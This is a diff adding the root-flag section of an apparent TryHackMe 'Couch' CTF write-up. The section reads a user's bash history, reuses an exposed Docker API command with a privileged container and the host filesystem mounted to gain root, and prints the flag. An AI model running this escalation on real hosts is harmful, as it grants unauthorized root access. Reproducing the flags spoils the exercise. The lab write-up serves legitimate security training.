@@ -225,6 +225,65 @@ THM{1ns3cure_couchdb}
 
 ## Root Flag
 
+Our next move should be vertical privilege escalation. We can try checking our current users ```sudo``` permissions with ```sudo -l``` but she has none.
+
+Next we can check their bash history to get an idea of what kind of commands they use. We'll do this by reading their ```.bash_history``` file.
+
+```
+...[REDACTED FOR BREVITY]...
+
+cd /root
+ls
+cd flag/
+ls
+cd ..
+rm -r flag/
+apt-get remove redis
+nano root.txt
+exit
+sudo deluser USERNAME sudo
+sudo deluser atena sudo
+exit
+sudo -s
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+uname -a
+exit
+```
+
+One of these commands stands out...
+
+```docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt```
+
+If we type out the same command we'll be given root access and put into a ```docker``` container that contains the host file system at ```/mnt```.
+
+```
+atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+
+/ #
+```
+
 ### root.txt
+
+Now that we're root we can look for the root flag by lisiting all contents in the ```/mnt/root``` directory.
+
+```
+/ # ls -la /mnt/root
+
+total 24
+drwx------    3 root     root          4096 Dec 18  2020 .
+drwxr-xr-x   22 root     root          4096 Oct 25  2020 ..
+-rw-r--r--    1 root     root          3106 Oct 22  2015 .bashrc
+drwxr-xr-x    2 root     root          4096 Oct 25  2020 .nano
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+-rw-r--r--    1 root     root            26 Dec 18  2020 root.txt
+```
+
+Here we'll find the root flag in a file named ```root.txt```.
+
+```
+/ # cat /mnt/root/root.txt
+
+THM{RCE_us1ng_Docker_API}
+```
 
 [Back To Top](#couch "Jump To Top")
